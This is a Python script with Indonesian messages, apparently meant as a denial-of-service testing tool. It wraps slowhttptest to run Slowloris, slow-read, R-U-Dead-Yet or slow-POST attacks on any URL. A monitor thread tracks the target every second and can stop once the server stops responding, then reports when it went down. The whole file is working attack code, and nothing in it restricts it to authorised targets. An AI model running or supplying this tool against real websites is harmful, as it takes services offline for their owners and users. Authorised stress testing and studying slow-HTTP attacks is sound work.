import subprocess
import time
import requests
import logging
import threading

logging.basicConfig(level=logging.DEBUG, format='[%(asctime)s] %(levelname)s: %(message)s')

def is_server_down(url):
    try:
        response = requests.get(url, timeout=5)
        return response.status_code >= 500
    except Exception:
        return True

def run_dos_attack(url, requests_num=100, duration=10, packet_size=1024, header=None, method='slowloris', connections_per_page=100, stop_on_down=False):
    stats = {
        "pending": 0,
        "connected": 0,
        "error": 0,
        "closed": 0,
        "timeline": []
    }
    down_at = None
    stop_reason = None
    start_time = time.time()

    cmd = [
        'slowhttptest',
        '-c', str(requests_num),
        '-r', str(connections_per_page),
        '-l', str(duration),
        '-s', str(packet_size),
        '-u', url,
        '-p', '3'
    ]
    if method == "slowloris":
        cmd += ['-H']
    elif method == "slowread":
        cmd += ['-B']
    elif method == "rudy":
        cmd += ['-X']
    elif method == "slowpost":
        cmd += ['-R']
    if header:
        cmd += ['-j', f"{header}"]

    logging.info(f"Menjalankan DoS test dengan metode: {method.upper()} - Command: {' '.join(cmd)}")
    process = subprocess.Popen(cmd)

    # Monitoring thread
    def monitor():
        nonlocal down_at, stop_reason
        while process.poll() is None:
            elapsed = int(time.time() - start_time)
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code >= 500:
                    stats["error"] += 1
                else:
                    stats["connected"] += 1
            except Exception:
                stats["error"] += 1
            stats["pending"] = max(0, requests_num - stats["connected"] - stats["error"] - stats["closed"])
            stats["timeline"].append({
                "detik": elapsed,
                "pending": stats["pending"],
                "connected": stats["connected"],
                "error": stats["error"],
                "closed": stats["closed"],
                "service_available": not is_server_down(url)
            })
            # Cek down hanya sekali per detik
            if stop_on_down and is_server_down(url):
                down_at = elapsed
                stop_reason = f"Proses dihentikan pada detik ke-{down_at} karena target tidak merespon."
                try:
                    process.terminate()
                except Exception:
                    pass
                break
            time.sleep(1)
        # Tambahkan 1 titik timeline terakhir setelah proses selesai
        elapsed = int(time.time() - start_time)
        stats["closed"] = requests_num - stats["pending"] - stats["connected"] - stats["error"]
        stats["timeline"].append({
            "detik": elapsed,
            "pending": stats["pending"],
            "connected": stats["connected"],
            "error": stats["error"],
            "closed": stats["closed"],
            "service_available": not is_server_down(url)
        })

    monitor_thread = threading.Thread(target=monitor)
    monitor_thread.start()
    process.wait()
    monitor_thread.join()

    summary = ""
    if down_at:
        summary = stop_reason or f"Server down pada detik ke-{down_at} dengan total koneksi {stats['connected'] + stats['error']}."
    elif not any(t["service_available"] == False for t in stats["timeline"]):
        summary = "DoS selesai tanpa membuat server down."
    else:
        # fallback jika server sempat down tapi variabel down_at tidak terisi
        summary = "Server sempat tidak merespon selama pengujian."

    return {
        "summary": summary,
        "timeline": stats["timeline"],
        "down_at": down_at
    }
